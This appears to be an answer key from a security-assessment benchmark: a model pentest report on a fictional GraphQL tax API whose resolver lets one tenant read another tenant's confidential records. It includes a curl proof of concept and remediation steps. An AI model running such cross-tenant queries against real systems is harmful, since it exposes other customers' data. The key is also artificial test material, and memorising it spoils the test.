# Expected Response

## System
- Domain: Tax Compliance / RegTech
- System: TaxGrid Compliance API
- Example ID: GQL-0148

## Priority Findings

### Finding 1: Tax Compliance — Resolver Traversal Injection Exposes Cross-Tenant Tax Records (Pattern 5.2)
**Severity:** Critical
**Category:** Injection / Resolver / Graph Traversal Injection

**Summary:**
Per §5.0 (Pattern 5.2 — resolver/graph traversal injection): The `getResource` resolver traverses the compliance graph without enforcing tenancy at each node, enabling cross-tenant tax record access. An attacker from `tenant-e190` queried `getResource(id: "R-2148")` and received tax compliance data belonging to `tenant-a21a`, including `CONFIDENTIAL-e190a21a`. In Tax Compliance / RegTech, this exposes filed tax returns, audit history, regulatory submissions, and financial disclosures.

**Evidence from HAR:**
- Request: `POST https://api.taxgrid-compliance-a.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-e190`
- Query: `getResource(id: "R-2148") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-a21a"`, `ownerId: "other-user-e190a21a"`, `sensitiveField: "CONFIDENTIAL-e190a21a"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e190a21a`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 5.2 | Graph traversal injection, no tenancy nodes |
| HAR request | x-tenant-id | Attacker tenant-e190 |
| HAR response | tenantId | Cross-tenant tax data tenant-a21a |
| HAR response | sensitiveField | CONFIDENTIAL-e190a21a |

## Steps to Reproduce

### Step 1 — getResource traversal injection (HAR)
```bash
curl -s -X POST https://api.taxgrid-compliance-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e190" \
  -d '{"query": "query { getResource(id: \"R-2148\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-a21a` tax records returned. **Secure:** FORBIDDEN.

## Remediation
1. Enforce tenancy at every graph traversal node: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Compliance graph resolvers must validate parent tenancy before traversing to children.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
